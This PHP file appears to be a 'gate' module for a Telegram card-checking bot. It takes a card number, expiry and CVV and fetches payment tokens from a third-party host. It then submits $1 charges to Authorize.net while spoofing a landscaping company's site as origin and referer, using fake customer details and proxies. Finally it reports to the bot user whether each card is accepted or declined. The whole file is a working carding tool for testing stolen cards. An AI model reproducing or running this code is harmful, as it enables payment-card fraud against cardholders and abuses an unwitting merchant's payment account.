<?php 

use App\Models\Bot;
use App\Gate\{CurlX, Make, Responses as Res};
use App\Faker\{Name, Address, PhoneNumber, Internet};

$ccs = $ccs[0];
$cc  = $ccs['cc'];
$cece = implode('|', $cc);
$user['ida'] = Bot::SendMsg($user['chat_id'], "<b>Gate <u>".$gate['name']."</u> <i>started</i>♻️\nCard: <code>".$cece."</code>\nTime:</b> <i>".Make::Took()."'s</i>", $user['msg_id'])['result']['message_id'];
$cc[2] = substr($cc[2], -2);

# -- REQ 1 -- #
# ~ REQ 2 ~ #
$headers1 = ['user-agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36'];
$site1 = ['url' => 'https://kirarigodsita.alwaysdata.net/vnc.php','method' => 'GET', 'post' => null, 'headers' => $headers1, 'cookie' => null, 'proxy' => null];
$req1 = Make::Create(1, $site1, $gate, $user);
IsUnspam($req1, $user);

$xhash = CurlX::ParseString($req1->body, '<xhash>','</xhash>');
$x_login = CurlX::ParseString($req1->body, '<x_login>','</x_login>');
$x_fp_timestamp = CurlX::ParseString($req1->body, '<x_fp_timestamp>','</x_fp_timestamp>');
$x_fp_sequence = CurlX::ParseString($req1->body, '<x_fp_sequence>','</x_fp_sequence>');

if(empty($xhash) || empty($x_login) || empty($x_fp_timestamp) || empty($x_fp_sequence)){
    Res::SetParams("Empty Req 1 Token");
    $res = Res::authnetccn();
    Bot::EditMsgTxt($user['chat_id'], $user['ida'], Make::Parse($lang['final'], $user, $cece, $res, $ccs['bin'], $gate['name']));
    exit();
}
Bot::EditMsgTxt($user['chat_id'], $user['ida'], Make::Wait(1, $cece, $gate['name'], $lang['wait']));

# ~ REQ 2 ~ #
$headers2 = ['Host: secure.authorize.net', 'Origin: http://www.greentechlandscapeplus.com', 'Content-Type: application/x-www-form-urlencoded', 'Referer: http://www.greentechlandscapeplus.com/', 'user-agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36'];
$post2 = 'x_login='.$x_login.'&x_fp_hash='.$xhash.'&x_fp_timestamp='.$x_fp_timestamp.'&x_fp_sequence='.$x_fp_sequence.'&x_version=3.1&x_show_form=payment_form&x_test_request=false&x_method=cc&x_email_customer=true&x_state=CA&x_country=US&x_first_name='.Name::firstName().'&x_last_name='.Name::lastName().'&x_phone=15023851039&x_email='.Internet::freeEmail().'&x_address=NY+Street+154&x_city=New+York&x_zip=10001&x_amount=1';
$site2 = ['url' => 'https://secure.authorize.net/gateway/transact.dll','method' => 'POST', 'post' => $post2, 'headers' => $headers2, 'cookie' => $cookie, 'proxy' => $proxy2];
$req2 = Make::Create(2, $site2, $gate, $user);
IsUnspam($req2, $user);
Bot::EditMsgTxt($user['chat_id'], $user['ida'], Make::Wait(2, $cece, $gate['name'], $lang['wait']));

# ~ REQ 3 ~ #
$headers3 = ['Host: secure.authorize.net', 'Origin: http://www.greentechlandscapeplus.com', 'Content-Type: application/x-www-form-urlencoded', 'Referer: http://www.greentechlandscapeplus.com/', 'user-agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36'];
$post3 = 'x_show_form=pf_receipt&x_login='.$x_login.'&x_fp_hash='.$xhash.'&x_fp_timestamp='.$x_fp_timestamp.'&x_fp_sequence='.$x_fp_sequence.'&x_version=3.1&x_test_request=false&x_method=cc&x_email_customer=true&x_amount=1&x_card_num='.$cc[0].'&x_exp_date='.$cc[1].$cc[2].'&x_first_name='.Name::firstName().'&x_last_name='.Name::lastName().'&x_company=&x_address=NY+Street+154&x_city=New+York&x_state=NY&x_zip=10001&x_country=US&x_email='.Internet::freeEmail().'&x_phone=15023851039';
$site3 = ['url' => 'https://secure.authorize.net/gateway/transact.dll','method' => 'POST', 'post' => $post3, 'headers' => $headers3, 'cookie' => $cookie, 'proxy' => $proxy2];
$req3 = Make::Create(3, $site3, $gate, $user);
IsUnspam($req3, $user);
Bot::EditMsgTxt($user['chat_id'], $user['ida'], Make::Wait(3, $cece, $gate['name'], $lang['wait']));
$resp_msg = Make::Analize($req3->body, '/html/body/div[1]/div/form/div[1]/div')[0];
$resp_msg = str_replace('Transaction Declined', '', $resp_msg);
Res::SetParams($resp_msg, $req3->body);
$res = Res::authnetccn();
Bot::EditMsgTxt($user['chat_id'], $user['ida'], Make::Parse($lang['final'], $user, $cece, $res, $ccs['bin'], $gate['name']));